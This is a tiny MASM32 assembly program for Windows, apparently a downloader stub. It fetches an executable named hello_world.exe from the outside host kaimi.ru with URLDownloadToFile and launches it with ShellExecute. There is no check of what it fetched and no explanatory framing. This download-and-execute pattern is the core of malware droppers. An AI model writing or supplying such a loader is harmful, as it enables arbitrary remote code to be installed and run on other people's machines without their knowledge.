.386
.model flat, stdcall
option casemap :none
 
include \masm32\include\windows.inc
include \masm32\macros\macros.asm
uselib kernel32, user32, urlmon, shell32
 
 
.code
start: 
  invoke URLDownloadToFile, 0, chr$("http://kaimi.ru/hello_world.exe"), chr$("hello_world.exe"), 0, 0
   invoke ShellExecute, 0, chr$("open"), chr$("hello_world.exe"), 0, 0, SW_SHOWNORMAL
   invoke ExitProcess, 0
end start